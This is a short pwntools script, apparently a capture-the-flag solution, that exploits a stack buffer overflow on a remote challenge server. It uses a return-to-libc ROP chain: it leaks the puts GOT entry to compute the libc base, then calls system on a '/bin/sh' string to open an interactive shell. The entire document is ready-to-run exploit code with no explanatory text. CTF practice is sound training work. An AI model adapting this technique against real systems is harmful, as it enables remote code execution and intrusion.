from pwn import  *
puts_plt = 0x4004e0
puts_got = 0x601018
pop_rdi = 0x4006f3
puts_off = 0x6f690
system_off = 0x45390
sh_off = 0x18cd17
main = 0x400636
r = remote('csie.ctf.tw', 10131)
r.send('a'*40 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) + "\n")
r.recvline()
a = r.recvline()
print a
b = u64(a.strip().ljust(8, "\x00"))
base = b - puts_off
system = system_off + base
print 'base:', base
r.send('a'*40 + p64(pop_rdi) + p64(sh_off + base) + p64(system) + "\n")
r.interactive()
